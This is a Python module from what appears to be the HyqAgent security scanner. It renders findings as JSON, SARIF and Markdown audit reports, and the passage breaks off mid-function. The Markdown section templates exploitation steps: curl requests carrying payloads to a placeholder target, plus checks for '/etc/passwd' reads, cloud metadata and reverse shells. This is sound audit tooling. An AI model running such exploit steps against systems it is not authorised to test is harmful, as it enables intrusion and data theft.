"""report/generator.py — JSON, Markdown, and SARIF report generation.

Converts a :class:`ScanResult <scanner.deterministic.ScanResult>` into
human-readable (Markdown) or machine-readable (JSON, SARIF) output.

Usage::

    generator = ReportGenerator()
    text = generator.generate(result, fmt="json", scan_duration_ms=3200)
"""

from __future__ import annotations

import json
import uuid
from datetime import UTC
from typing import Any

try:
    from hyqagent.scanner.deterministic import Finding, ScanResult
except ImportError:  # pragma: no cover
    Finding = Any  # type: ignore[assignment,misc]
    ScanResult = Any  # type: ignore[assignment,misc]


class ReportGenerator:
    """Generate scan reports in JSON, Markdown, or SARIF format."""

    # ── Public API ────────────────────────────────────────────────────

    def generate(
        self,
        result: ScanResult,
        fmt: str = "json",
        scan_duration_ms: int = 0,
        files_scanned: int = 0,
        language: str = "",
        mode: str = "quick",
        hypotheses: list[Any] | None = None,
        convergence: Any = None,
        cost_summary: Any = None,
        completeness_review: dict[str, Any] | None = None,
        coverage_audit: Any = None,
        phases_completed: list[str] | None = None,
        validations: list[Any] | None = None,
        dynamic_verification_results: list[Any] | None = None,
    ) -> str:
        """Generate a report in *fmt* format.

        Args:
            result: The :class:`ScanResult` from :meth:`DeterministicScanner.scan_all`.
            fmt: One of ``"json"``, ``"markdown"``, ``"sarif"``.
            scan_duration_ms: Total scan duration in milliseconds.
            files_scanned: Number of source files processed.
            language: Programming language scanned.
            mode: ``"quick"`` (deterministic only) or ``"deep"`` (LLM-augmented).
            hypotheses: LLM-generated hypotheses (deep mode only).
            convergence: :class:`ConvergenceReport` (deep mode only).
            cost_summary: :class:`CostSummary` (deep mode only).
            completeness_review: Completeness critic output (deep mode only).
            coverage_audit: :class:`CoverageAuditResult` (deep mode only).
            phases_completed: List of completed phase names (deep mode only).
            validations: :class:`ValidationResult` list (deep mode only).
            dynamic_verification_results: Dynamic verification output (deep mode only).

        """
        # Build a deep-audit context dict for format methods
        deep_ctx: dict[str, Any] | None = None
        if mode == "deep":
            deep_ctx = {
                "mode": mode,
                "hypotheses": hypotheses or [],
                "convergence": convergence,
                "cost_summary": cost_summary,
                "completeness_review": completeness_review,
                "coverage_audit": coverage_audit,
                "phases_completed": phases_completed or [],
                "validations": validations or [],
                "dynamic_verification_results": dynamic_verification_results or [],
            }

        if fmt in ("markdown", "md"):
            return self._to_markdown(
                result,
                scan_duration_ms,
                files_scanned,
                language,
                deep_ctx,
            )
        if fmt == "sarif":
            return self._to_sarif(
                result,
                scan_duration_ms,
                files_scanned,
                language,
            )
        return self._to_json(
            result,
            scan_duration_ms,
            files_scanned,
            language,
            deep_ctx,
        )

    # ── JSON ──────────────────────────────────────────────────────────

    def _to_json(
        self,
        result: ScanResult,
        scan_duration_ms: int,
        files_scanned: int,
        language: str,
        deep_ctx: dict[str, Any] | None = None,
    ) -> str:
        """Produce a rich JSON report."""
        # Build simplified annotated-path summaries
        path_summaries: list[dict[str, Any]] = []
        for ap in getattr(result, "annotated_paths", []) or []:
            label = ap.label.value if hasattr(ap.label, "value") else str(ap.label)
            ss = ap.sanitizer_status
            sanitizer_status = ss.value if hasattr(ss, "value") else str(ss) if ss else None
            path_summaries.append(
                {
                    "label": label,
                    "sanitizer_status": sanitizer_status,
                    "node_count": len(getattr(ap.path, "nodes", [])),
                }
            )

        # Count labels
        from collections import Counter

        label_counts = Counter(ps["label"] for ps in path_summaries)

        output: dict[str, Any] = {
            "scan_info": {
                "version": self._resolve_version(),
                "mode": deep_ctx["mode"] if deep_ctx is not None else "quick",
                "duration_ms": scan_duration_ms,
                "files_scanned": files_scanned,
                "language": language,
                "timestamp": self._timestamp(),
            },
            "findings": [self._finding_to_dict(f) for f in (getattr(result, "findings", []) or [])],
            "annotated_paths": [
                {"label": label, "count": count} for label, count in sorted(label_counts.items())
            ],
            "coverage": self._coverage_dict(result),
            "blind_spot_manifest": self._blind_spot_list(result),
            "stats": getattr(result, "stats", {}) or {},
        }

        # ── Deep audit sections ───────────────────────────────────
        if deep_ctx is not None:
            ctx: dict[str, Any] = deep_ctx

            # Hypotheses summary
            hypotheses: list[dict[str, Any]] = []
            for h in ctx.get("hypotheses", []):
                hypotheses.append(
                    {
                        "id": getattr(h, "id", ""),
                        "title": getattr(h, "title", ""),
                        "vuln_type": getattr(h, "vuln_type", ""),
                        "cwe_id": getattr(h, "cwe_id", ""),
                        "severity": getattr(h, "severity", ""),
                        "confidence": getattr(h, "confidence", 0.0),
                        "source_location": getattr(h, "source_location", ""),
                        "sink_location": getattr(h, "sink_location", ""),
                    }
                )
            output["hypotheses"] = hypotheses

            # Validations summary
            validations: list[dict[str, Any]] = []
            for v in ctx.get("validations", []):
                validations.append(
                    {
                        "hypothesis_id": getattr(v, "hypothesis_id", ""),
                        "verdict": str(getattr(v, "verdict", "")),
                        "evidence_strength": str(getattr(v, "evidence_strength", "")),
                    }
                )
            output["validations"] = validations

            # Convergence
            conv = ctx.get("convergence")
            if conv is not None:
                output["convergence"] = {
                    "summary": getattr(conv, "summary", str(conv)),
                    "rounds": getattr(conv, "round", 0),
                    "status": str(getattr(conv, "recommendation", "unknown")),
                }

            # Cost
            cost = ctx.get("cost_summary")
            if cost is not None:
                output["cost"] = {
                    "total_cost": getattr(cost, "total_cost", 0.0),
                    "prompt_tokens": getattr(cost, "total_input_tokens", 0),
                    "completion_tokens": getattr(cost, "total_output_tokens", 0),
                    "total_tokens": (
                        getattr(cost, "total_input_tokens", 0)
                        + getattr(cost, "total_output_tokens", 0)
                    ),
                }

            # Deep audit meta
            output["deep_audit"] = {
                "phases_completed": ctx.get("phases_completed", []),
                "hypotheses_count": len(hypotheses),
                "validations_count": len(validations),
                "convergence_rounds": (getattr(conv, "round", 0) if conv is not None else 0),
                "total_llm_cost": (getattr(cost, "total_cost", 0.0) if cost is not None else 0.0),
            }

        return json.dumps(output, ensure_ascii=False, indent=2)

    # ── Markdown ──────────────────────────────────────────────────────

    def _to_markdown(
        self,
        result: ScanResult,
        scan_duration_ms: int,
        files_scanned: int,
        language: str,
        deep_ctx: dict[str, Any] | None = None,
    ) -> str:
        """Produce a Shannon-style human-readable Markdown report.

        Report structure:
        1. Target Information
        2. Executive Summary (prose + severity table + category breakdown)
        3. Findings grouped by OWASP vulnerability category
        4. Appendices (LLM data, coverage, blind spots — deep mode only)
        """
        findings = getattr(result, "findings", []) or []
        is_deep = deep_ctx is not None
        mode_label = "deep (LLM enhanced)" if is_deep else "quick (zero-LLM deterministic)"

        # Enrich findings with deep audit cross-reference data (matches
        # hypotheses + validations + dynamic verification to findings).
        enriched: list[Any] = self._enrich_findings(list(findings), deep_ctx)

        # ── Title ──
        lines: list[str] = [
            "# HyqAgent 安全审计报告",
            "",
        ]

        # ── 1. Target Information ──
        lines.extend(
            self._build_target_info_table(language, files_scanned, scan_duration_ms, mode_label)
        )

        # ── 2. Executive Summary ──
        lines.extend(self._build_executive_summary(enriched, deep_ctx))

        # ── 3. Findings by OWASP Category ──
        if enriched:
            grouped = self._group_findings_by_owasp(enriched)
            for cat_name in self._category_display_order():
                cat_findings = grouped.get(cat_name)
                if not cat_findings:
                    continue
                lines.extend(
                    self._build_category_section(cat_name, cat_findings, language)
                )
            lines.append("")
        else:
            lines.append("## ✅ 未发现问题")
            lines.append("")
            lines.append("该次扫描未发现任何确定性漏洞。")
            lines.append("")

        # ── 4. Appendices (deep mode) ──
        lines.extend(self._build_appendices(result, deep_ctx))

        return "\n".join(lines)

    # ── Markdown building blocks ──────────────────────────────────────

    @staticmethod
    def _build_target_info_table(
        language: str,
        files_scanned: int,
        scan_duration_ms: int,
        mode_label: str,
    ) -> list[str]:
        """Build the Target Information section."""
        from hyqagent.report.generator import ReportGenerator

        lines: list[str] = [
            "## 📋 目标信息 (Target Information)",
            "",
            "| 属性 | 值 |",
            "|------|----|",
            f"| **评估日期** | {ReportGenerator._timestamp()} |",
            f"| **审计模式** | {mode_label} |",
            f"| **目标语言** | {language or 'auto'} |",
            f"| **扫描文件数** | {files_scanned} |",
            f"| **扫描耗时** | {ReportGenerator._format_duration(scan_duration_ms)} |",
            f"| **工具版本** | HyqAgent {ReportGenerator._resolve_version()} |",
            "",
        ]
        return lines

    @staticmethod
    def _build_executive_summary(
        findings: list[Any],
        deep_ctx: dict[str, Any] | None,
    ) -> list[str]:
        """Build the Executive Summary section with prose and tables."""
        from collections import Counter

        from hyqagent.report.templates import lookup_owasp_category

        lines: list[str] = [
            "## 📊 执行摘要 (Executive Summary)",
            "",
        ]

        total = len(findings)
        if total == 0:
            lines.append("本次审计**未发现任何安全漏洞**。目标代码的安全状况良好，所有检测项均通过。")
            lines.append("")
            return lines

        sev_counts = Counter(getattr(f, "severity", "unknown") for f in findings)
        critical = sev_counts.get("critical", 0)
        high = sev_counts.get("high", 0)
        medium = sev_counts.get("medium", 0)

        # Prose summary — single paragraph for CISO-level reading
        parts: list[str] = [f"本次安全审计共发现 **{total}** 个安全漏洞"]
        if critical:
            parts.append(f"其中 **{critical}** 个严重（Critical）漏洞需要**立即修复**")
        if high:
            parts.append(f"**{high}** 个高危（High）漏洞构成显著风险")
        if medium:
            parts.append(f"**{medium}** 个中危（Medium）漏洞")
        lines.append("，".join(parts) + "。")
        lines.append("")

        if critical > 0:
            lines.append(
                "> 🔴 **立即行动**：存在严重级别漏洞，建议立即组建应急响应小组，"
                "优先修复所有 Critical 级别发现，并在 24 小时内修复所有 High 级别发现。"
            )
        elif high > 0:
            lines.append(
                "> 🟠 **建议尽快修复**：存在高危漏洞，建议在本 Sprint 内按照"
                "报告中提供的修复建议完成修复。"
            )
        lines.append("")

        # Severity distribution table
        lines.append("### 严重度分布")
        lines.append("")
        lines.append("| 严重度 | 数量 | 占比 |")
        lines.append("|--------|------|------|")
        sev_emoji = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}
        for sev in ("critical", "high", "medium", "low"):
            c = sev_counts.get(sev, 0)
            if c > 0:
                pct = f"{c / total * 100:.0f}%"
                lines.append(f"| {sev_emoji.get(sev, '⚪')} {sev} | {c} | {pct} |")
        lines.append("")

        # Category breakdown table
        lines.append("### 按漏洞类别汇总")
        lines.append("")
        lines.append("| 类别 | 数量 | 最高严重度 |")
        lines.append("|------|------|-----------|")

        cat_aggs: dict[tuple[str, str], dict[str, Any]] = {}
        sev_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1, "unknown": 0}
        for f in findings:
            category = getattr(f, "category", "")
            primary = category.split(",")[0].strip() if category else ""
            _, prefix, display_name = lookup_owasp_category(primary)
            key = (prefix, display_name)
            if key not in cat_aggs:
                cat_aggs[key] = {"count": 0, "max_sev": "low", "max_rank": 0}
            cat_aggs[key]["count"] += 1
            sev = getattr(f, "severity", "low")
            rank = sev_rank.get(sev, 0)
            if rank > cat_aggs[key]["max_rank"]:
                cat_aggs[key]["max_sev"] = sev
                cat_aggs[key]["max_rank"] = rank

        for (_prefix, display_name), ag in sorted(
            cat_aggs.items(), key=lambda x: x[1]["count"], reverse=True
        ):
            icon = sev_emoji.get(ag["max_sev"], "⚪")
            lines.append(f"| {icon} {display_name} | {ag['count']} | {ag['max_sev']} |")
        lines.append("")

        # Deep audit summary line
        if deep_ctx is not None:
            ctx = deep_ctx
            cost = ctx.get("cost_summary")
            conv = ctx.get("convergence")
            dv_results = ctx.get("dynamic_verification_results", [])
            confirmed_dv = sum(1 for r in dv_results if r.get("verdict") == "confirmed")
            hyp_count = len(ctx.get("hypotheses", []))

            lines.append(
                f"*LLM 增强审计：{hyp_count} 个假设 · "
                f"{getattr(conv, 'round', '?')} 轮收敛 · "
            )
            cost_str = f"${getattr(cost, 'total_cost', 0.0):.4f}" if cost else "N/A"
            if confirmed_dv:
                lines[-1] += f"{confirmed_dv} 沙箱确认 · "
            lines[-1] += f"成本 {cost_str}*"
            lines.append("")

        return lines

    @staticmethod
    def _group_findings_by_owasp(
        findings: list[Any],
    ) -> dict[str, list[Any]]:
        """Group findings by their OWASP category section name.

        Each finding gets a synthetic ``_display_id`` attribute like
        ``"INJ-001"`` set on it for use in the category section.
        """
        from hyqagent.report.templates import lookup_owasp_category

        # Assign display IDs: one counter per category prefix
        counters: dict[str, int] = {}
        grouped: dict[str, list[Any]] = {}

        for f in findings:
            category = getattr(f, "category", "")
            primary = category.split(",")[0].strip() if category else ""
            section_name, prefix, _display_name = lookup_owasp_category(primary)
            if prefix not in counters:
                counters[prefix] = 0
            counters[prefix] += 1
            f._display_id = f"{prefix}-{counters[prefix]:03d}"
            grouped.setdefault(section_name, []).append(f)

        return grouped

    @staticmethod
    def _category_display_order() -> list[str]:
        """Canonical ordering of OWASP category section names."""
        from hyqagent.report.templates import get_category_order

        return get_category_order()

    def _build_category_section(
        self,
        cat_name: str,
        cat_findings: list[Any],
        language: str,
    ) -> list[str]:
        """Build a single OWASP-category H1 section with all its findings."""
        lines: list[str] = []
        lines.append("---")
        lines.append("")
        lines.append(f"# {cat_name}")
        lines.append("")

        for f in cat_findings:
            lines.extend(self._build_finding_shannon_style(f, language))
            lines.append("---")
            lines.append("")

        return lines

    def _build_finding_shannon_style(
        self,
        f: Any,
        language: str,
    ) -> list[str]:
        """Render a single finding in Shannon-style format.

        Structure: Summary → Prerequisites → Exploitation Steps →
        Code Reference → Proof of Impact → Remediation.
        """
        from hyqagent.report.templates import (
            cvss_severity_label,
            lookup_cwe_name,
            lookup_owasp_category,
            lookup_prerequisites,
            lookup_proof_of_impact,
        )

        lines: list[str] = []

        # ── Header line ──
        disp_id = getattr(f, "_display_id", getattr(f, "id", "???"))
        title = getattr(f, "title", "Untitled")
        sev = getattr(f, "severity", "medium")
        cwe_id = getattr(f, "cwe_id", "")
        cvss_score = getattr(f, "cvss_score", 0.0)

        sev_emoji = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}.get(sev, "⚪")
        cwe_label = ""
        if cwe_id:
            cwe_name = lookup_cwe_name(cwe_id)
            cwe_label = f"{cwe_id}: {cwe_name}" if cwe_name else cwe_id
        cvss_label = ""
        if cvss_score > 0:
            cvss_label = f"CVSS {cvss_score} ({cvss_severity_label(cvss_score)})"

        header_parts = [f"### {sev_emoji} {disp_id}: {title}"]
        header_parts.append(f"[{sev.upper()}]")
        if cwe_label:
            header_parts.append(cwe_label)
        if cvss_label:
            header_parts.append(cvss_label)
        lines.append(" ".join(header_parts))
        lines.append("")

        # ── Summary ──
        lines.append("#### Summary")
        lines.append("")

        src_loc = getattr(f, "source_location", "")
        sink_loc = getattr(f, "sink_location", "")
        file_path = getattr(f, "file_path", "")
        line_num = getattr(f, "line", 0)
        desc = getattr(f, "description", "")
        impact_text = getattr(f, "impact", "")
        category = getattr(f, "category", "")
        primary_vuln = category.split(",")[0].strip() if category else ""
        _, __, display_type = lookup_owasp_category(primary_vuln)

        # Vulnerable location
        if src_loc and sink_loc:
            lines.append(f"- **Vulnerable location:** `{src_loc}` → `{sink_loc}`")
        elif file_path:
            lines.append(f"- **Vulnerable location:** `{file_path}:{line_num}`")
        else:
            lines.append(f"- **Vulnerable location:** `{file_path or 'unknown'}:{line_num}`")

        # Overview
        if desc:
            lines.append(f"- **Overview:** {desc}")
        else:
            lines.append(
                f"- **Overview:** {display_type} vulnerability "
                f"detected via taint analysis"
            )
        # Impact (concise)
        if impact_text:
            first_line = impact_text.split("\n")[0].strip()
            lines.append(f"- **Impact:** {first_line}")
        lines.append("")

        # ── Prerequisites ──
        lines.append("**Prerequisites:**")
        lines.append("")
        prereqs = lookup_prerequisites(primary_vuln) if primary_vuln else ""
        if prereqs:
            lines.append(prereqs)
        else:
            lines.append("- 攻击者可以访问受影响的功能端点")
        lines.append("")

        # ── Exploitation Steps ──
        lines.extend(self._build_exploitation_steps(f))
        lines.append("")

        # ── Code Reference ──
        lines.append("**Code Reference:**")
        lines.append("")
        code = getattr(f, "code_snippet", "")
        if code:
            lang = language or ""
            lines.append(f"```{lang}")
            lines.append(code.strip())
            lines.append("```")
        elif file_path:
            lines.append(f"See `{file_path}:{line_num}`")
        lines.append("")

        # ── Proof of Impact ──
        lines.append("**Proof of Impact:**")
        lines.append("")
        poi = lookup_proof_of_impact(primary_vuln) if primary_vuln else ""
        if poi:
            lines.append(poi)
        else:
            lines.append(
                "成功利用此漏洞后，攻击者可以绕过安全控制机制，对应用系统的"
                "机密性、完整性或可用性造成损害。"
            )
        lines.append("")

        # ── Remediation ──
        remediation = getattr(f, "remediation", "")
        if remediation:
            lines.append("**Remediation:**")
            lines.append("")
            lines.append(remediation)
            lines.append("")

        # ── LLM validation cross-reference (if available) ──
        val_verdict = getattr(f, "validation_verdict", "")
        val_conf = getattr(f, "validation_confidence", 0.0)
        if val_verdict == "confirmed":
            lines.append(f"*🤖 LLM 验证: ✅ confirmed ({val_conf:.0%})*")
        elif val_verdict == "rejected":
            lines.append(f"*🤖 LLM 验证: ❌ rejected ({val_conf:.0%})*")
        if val_verdict:
            lines.append("")

        return lines

    @staticmethod
    def _build_exploitation_steps(finding: Any) -> list[str]:
        """Build exploitation steps for a finding.

        If HTTP endpoint data is available, generates concrete curl/httpie
        commands.  Otherwise, constructs steps from the code-path description
        and vulnerability type — always produces output.
        """
        endpoint = getattr(finding, "endpoint", "")
        http_method = getattr(finding, "http_method", "GET")
        http_params = getattr(finding, "http_params", "")
        cwe_id = getattr(finding, "cwe_id", "")
        category = getattr(finding, "category", "")
        primary_vuln = category.split(",")[0].strip() if category else ""

        lines: list[str] = ["**Exploitation Steps:**", ""]

        # Step 1 — craft payload
        payload, payload_desc = _payload_for_vuln(cwe_id, primary_vuln)
        lines.append(f"1. {payload_desc}")

        # Step 2 — send request (with curl if endpoint available)
        if endpoint:
            param_str = ""
            if payload and http_params:
                params = [p.strip() for p in http_params.split(",") if p.strip()]
                if params:
                    param_str = "?" + "&".join(f"{p}={payload}" for p in params)
            elif payload:
                param_str = f"?param={payload}"

            lines.append("")
            lines.append(
                f"2. Send the request to `{http_method} {endpoint}{param_str}`"
            )
            lines.append("")
            curl_cmd = f"curl -X {http_method} 'http://<target>{endpoint}{param_str}'"
            if http_method in ("POST", "PUT", "PATCH") and param_str:
                curl_cmd = (
                    f"curl -X {http_method} 'http://<target>{endpoint}' \\\n"
                    f"  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
                    f"  -d '{param_str.lstrip('?')}'"
                )
            lines.append("```bash")
            lines.append(curl_cmd)
            lines.append("```")
        else:
            src_loc = getattr(finding, "source_location", "")
            sink_loc = getattr(finding, "sink_location", "")
            file_path = getattr(finding, "file_path", "")
            line_num = getattr(finding, "line", 0)
            code = getattr(finding, "code_snippet", "")

            lines.append("")
            lines.append(
                "2. The tainted data flows from the source to the sink "
                "without proper sanitization:"
            )
            lines.append("")
            loc = src_loc or sink_loc or f"{file_path}:{line_num}" if file_path else "N/A"
            lines.append(f"   - **Location:** `{loc}`")
            if code:
                lines.append(f"   - **Vulnerable code:** `{code.strip()[:120]}`")
            if payload:
                lines.append(f"   - **Test payload:** `{payload}`")
        lines.append("")

        # Step 3 — verify
        lines.append("3. Observe the response — confirm:")
        if "CWE-89" in (cwe_id or ""):
            lines.append("   - Database error messages or unexpected data in the response")
            lines.append("   - Ability to extract data via UNION-based or boolean-based techniques")
        elif "CWE-79" in (cwe_id or ""):
            lines.append("   - JavaScript execution in the browser (alert popup)")
            lines.append("   - Session cookie accessible via `document.cookie`")
        elif "CWE-918" in (cwe_id or ""):
            lines.append("   - Internal service response in the returned content")
            lines.append("   - Cloud metadata (e.g., `ami-id`, `security-groups`) visible")
        elif "CWE-78" in (cwe_id or "") or "CWE-77" in (cwe_id or ""):
            lines.append("   - Command output reflected in the response")
            lines.append("   - Reverse shell connection received on the attacker's listener")
        elif "CWE-22" in (cwe_id or ""):
            lines.append("   - File contents (e.g., `/etc/passwd`) in the response")
            lines.append("   - Ability to read files outside the intended directory")
        elif "CWE-502" in (cwe_id or ""):
            lines.append("   - Application crash or unexpected behavior after payload delivery")
            lines.append("   - Reverse shell or command execution confirmed")
        else:
            lines.append("   - Unexpected behavior or error messages")
            lines.append("   - Sensitive data leakage or privilege escalation")

        return lines

    # ── Appendices builder ────────────────────────────────────────────

    def _build_appendices(
        self,
        result: ScanResult,
        deep_ctx: dict[str, Any] | None,
    ) -> list[str]:
        """Build the appendices section (LLM data, coverage, blind spots)."""
        lines: list[str] = []

        lines.append("---")
        lines.append("")
        lines.append("# 附录 (Appendices)")
        lines.append("")

        is_deep = deep_ctx is not None

        # ── Deep audit appendices ──
        if is_deep:
            assert deep_ctx is not None  # mypy type narrowing
            ctx: dict[str, Any] = deep_ctx

            # LLM Hypotheses
            hypotheses = ctx.get("hypotheses", [])
            if hypotheses:
                lines.append("## 🤖 LLM 假设详情")
                lines.append("")
                lines.append("| # | 类型 | CWE | 严重度 | 置信度 | 源 | 汇 |")
                lines.append("|---|------|-----|--------|--------|----|----|")
                for j, h in enumerate(hypotheses, 1):
                    vt = getattr(h, "vuln_type", "?")
                    cwe = getattr(h, "cwe_id", "")
                    sev_h = getattr(h, "severity", "?")
                    conf_h = getattr(h, "confidence", 0.0)
                    src_h = getattr(h, "source_location", "")[:30]
                    sink_h = getattr(h, "sink_location", "")[:30]
                    lines.append(
                        f"| {j} | {vt} | {cwe} | {sev_h} | {conf_h:.0%} | "
                        f"`{src_h}` | `{sink_h}` |"
                    )
                lines.append("")

            # Dynamic verification (if available)
            dv_results = ctx.get("dynamic_verification_results", [])
            if dv_results:
                lines.append("## 🧪 动态验证 (沙箱)")
                lines.append("")
                lines.append("| # | 漏洞类型 | 严重度 | 验证结果 | 置信度 |")
                lines.append("|---|----------|--------|----------|--------|")
                for j, dv in enumerate(dv_results, 1):
                    vt = dv.get("vuln_type", "?")
                    sev_dv = dv.get("severity", "?")
                    verdict = dv.get("verdict", "?")
                    uconf = dv.get("updated_confidence", 0.0)
                    v_icon = {
                        "confirmed": "✅",
                        "rejected": "❌",
                        "inconclusive": "⚠️",
                    }.get(verdict, "❓")
                    lines.append(
                        f"| {j} | {vt} | {sev_dv} | {v_icon} {verdict} | {uconf:.0%} |"
                    )

                # PoC snippets from dynamic verification
                for dv in dv_results:
                    poc_code = dv.get("poc_code", "")
                    if poc_code:
                        lines.append("")
                        lines.append("### PoC 示例")
                        lines.append("")
                        lang = dv.get("language", "bash")
                        lines.append(f"```{lang}")
                        lines.append(poc_code[:2000])
                        lines.append("```")
                lines.append("")

            # Convergence
            conv = ctx.get("convergence")
            if conv is not None:
                lines.append("## 🔄 收敛信息")
                lines.append("")
                lines.append(f"- **轮次**: {getattr(conv, 'round', '?')}")
                lines.append(f"- **状态**: {getattr(conv, 'recommendation', 'unknown')}")
                if getattr(conv, "escalate_reason", ""):
                    lines.append(f"- **原因**: {conv.escalate_reason}")
                conv_summary = str(getattr(conv, "summary", ""))
                if conv_summary:
                    lines.append(f"- **指标**: {conv_summary}")
                lines.append("")

            # Cost
            cost = ctx.get("cost_summary")
            if cost is not None:
                lines.append("## 💰 LLM 成本")
                lines.append("")
                lines.append("| 指标 | 值 |")
                lines.append("|------|----|")
                lines.append(f"| 总成本 | ${getattr(cost, 'total_cost', 0.0):.4f} |")
                lines.append(
                    f"| Prompt tokens | {getattr(cost, 'total_input_tokens', 0):,} |"
                )
                lines.append(
                    f"| Completion tokens | {getattr(cost, 'total_output_tokens', 0):,} |"
                )
                lines.append(f"| 扫描耗时 | {ReportGenerator._format_duration(0)} |")
                lines.append("")

            # Phases
            phases = ctx.get("phases_completed", [])
            if phases:
                lines.append("## 📋 执行阶段")
                lines.append("")
                for p in phases:
                    lines.append(f"- ✅ {p}")
                lines.append("")

        # ── Coverage (both modes) ──
        coverage = getattr(result, "coverage", None)
        if coverage:
            lines.append("## 📈 覆盖率")
            lines.append("")
            ep_cov = getattr(coverage, "endpoint_coverage_ratio", 0.0)
            sk_cov = getattr(coverage, "sink_coverage_ratio", 0.0)
            lines.append("| 维度 | 覆盖率 |")
            lines.append("|------|--------|")
            lines.append(f"| 端点覆盖 | {ep_cov * 100:.1f}% |")
            lines.append(f"| Sink 覆盖 | {sk_cov * 100:.1f}% |")
            lines.append("")

        # ── Blind spots (both modes) ──
        blind_spots = self._blind_spot_list(result)
        if blind_spots:
            lines.append("## ⚠️ 盲区清单")
            lines.append("")
            lines.append("以下代码路径当前扫描未覆盖，可能存在遗漏的漏洞：")
            lines.append("")
            for bs in blind_spots:
                sev_bs = bs.get("severity", "medium")
                lines.append(
                    f"- **[{sev_bs.upper()}]** {bs.get('location', '?')}: "
                    f"{bs.get('reason', '')}"
                )
                rec = bs.get("recommendation", "")
                if rec:
                    lines.append(f"  → {rec}")
            lines.append("")

        return lines

    # ── SARIF ──────────────────────────────────────────────────────────

    def _to_sarif(
        self,
        result: ScanResult,
        scan_duration_ms: int,
        files_scanned: int,
        language: str,
    ) -> str:
        """Produce a SARIF v2.1.0 report (for GitHub Code Scanning)."""
        findings = getattr(result, "findings", []) or []

        # Build SARIF results
        sarif_results: list[dict[str, Any]] = []
        rules: dict[str, dict[str, Any]] = {}
        rule_index: dict[str, int] = {}

        for i, f in enumerate(findings):
            rid = getattr(f, "rule_id", f"UNKNOWN-{i}")
            if rid not in rule_index:
                rule_index[rid] = len(rule_index)
                rules[rid] = {
                    "id": rid,
                    "shortDescription": {
                        "text": getattr(f, "title", rid),
                    },
                    "help": {
                        "text": getattr(f, "remediation", ""),
                        "markdown": getattr(f, "description", ""),
                    },
                    "properties": {
                        "security-severity": _severity_score(getattr(f, "severity", "medium")),
                    },
                }

            sev = getattr(f, "severity", "medium")
            fpath = getattr(f, "file_path", "")
            line_num = getattr(f, "line", 0)
            code = getattr(f, "code_snippet", "")

            region = {"startLine": line_num} if line_num else {}

            location = {
                "physicalLocation": {
                    "artifactLocation": {
                        "uri": fpath,
                    },
                },
            }
            if region:
                location["physicalLocation"]["region"] = region

            if code:
                location["physicalLocation"]["contextRegion"] = {
                    "snippet": {"text": code},
                }

            sarif_results.append(
                {
                    "ruleId": rid,
                    "ruleIndex": rule_index[rid],
                    "level": _sarif_level(sev),
                    "message": {
                        "text": (
                            f"{getattr(f, 'title', rid)}: "
                            f"{getattr(f, 'description', '')[:200]}"
                        ),
                    },
                    "locations": [location],
                }
            )

        sarif = {
            "$schema": (
                "https://raw.githubusercontent.com/oasis-tcs/"
                "sarif-spec/master/Schemata/sarif-schema-2.1.0.json"
            ),
            "version": "2.1.0",
            "runs": [
                {
                    "tool": {
                        "driver": {
                            "name": "HyqAgent",
                            "version": self._resolve_version(),
                            "informationUri": "https://github.com/hyqagent/hyqagent",
                            "rules": [rules[rid] for rid in sorted(rules)],
                        },
                    },
                    "results": sarif_results,
                },
            ],
        }

        return json.dumps(sarif, ensure_ascii=False, indent=2)

    # ── Helpers ────────────────────────────────────────────────────────

    @staticmethod
    def _finding_to_dict(f: Finding) -> dict[str, Any]:
        """Convert a single Finding to a JSON-serializable dict."""
        d: dict[str, Any] = {
            "id": getattr(f, "id", str(uuid.uuid4())),
            "rule_id": getattr(f, "rule_id", ""),
            "severity": getattr(f, "severity", "medium"),
            "confidence": getattr(f, "confidence", "high"),
            "title": getattr(f, "title", ""),
            "description": getattr(f, "description", ""),
            "file_path": getattr(f, "file_path", ""),
            "line": getattr(f, "line", 0),
            "code_snippet": getattr(f, "code_snippet", ""),
            "category": getattr(f, "category", ""),
            "remediation": getattr(f, "remediation", ""),
            "metadata": getattr(f, "metadata", {}),
        }
        # Enriched fields (deep audit only — omit if empty to keep output lean)
        for key in (
            "cwe_id",
            "cvss_score",
            "cvss_vector",
            "endpoint",
            "http_method",
            "http_params",
            "impact",
            "poc",
            "source_location",
            "sink_location",
        ):
            val = getattr(f, key, "")
            if val:  # skip empty/zero for lean output
                d[key] = val
        return d

    @staticmethod
    def _coverage_dict(result: ScanResult) -> dict[str, Any] | None:
        """Extract coverage data from result, if present."""
        coverage = getattr(result, "coverage", None)
        if coverage is None:
            return None
        return {
            "endpoint_total": getattr(coverage, "endpoint_total", 0),
            "endpoint_analyzed": getattr(coverage, "endpoint_analyzed", 0),
            "endpoint_coverage_ratio": getattr(coverage, "endpoint_coverage_ratio", 0.0),
            "sink_total": getattr(coverage, "sink_total", 0),
            "sink_labeled": getattr(coverage, "sink_labeled", 0),
            "sink_coverage_ratio": getattr(coverage, "sink_coverage_ratio", 0.0),
        }

    @staticmethod
    def _blind_spot_list(result: ScanResult) -> list[dict[str, Any]]:
        """Extract blind spots."""
        coverage = getattr(result, "coverage", None)
        if coverage is None:
            return []
        spots = getattr(coverage, "blind_spots", []) or []
        return [
            {
                "location": getattr(bs, "location", ""),
                "reason": getattr(bs, "reason", ""),
                "recommendation": getattr(bs, "recommendation", ""),
                "severity": getattr(bs, "severity", "medium"),
            }
            for bs in spots
        ]

    @staticmethod
    def _enrich_findings(
        findings: list[Any],
        deep_ctx: dict[str, Any] | None,
    ) -> list[Any]:
        """Cross-reference findings with deep audit context.

        For each finding, attach validation verdict, PoC from dynamic
        verification, and matching hypothesis data.  Returns the same
        list — we mutate in place then return for chaining.
        """
        if not deep_ctx or not findings:
            return findings

        # Build lookup maps from deep audit data
        hypotheses = deep_ctx.get("hypotheses", [])
        validations = deep_ctx.get("validations", [])
        dv_results = deep_ctx.get("dynamic_verification_results", [])

        # Map source+sink → hypothesis (for finding enrichment)
        hyp_by_key: dict[str, Any] = {}
        for h in hypotheses:
            key = getattr(h, "stable_key", "")
            if not key:
                src = getattr(h, "source_location", "")
                sink = getattr(h, "sink_location", "")
                vt = getattr(h, "vuln_type", "")
                if src and sink:
                    key = f"{src}|{sink}|{vt}"
            if key:
                hyp_by_key[key] = h

        # Map hypothesis_id → validation result
        val_by_hyp: dict[str, Any] = {}
        for v in validations:
            hid = getattr(v, "hypothesis_id", "")
            if hid:
                val_by_hyp[hid] = v

        # Map vuln_type → dynamic verification (best-effort)
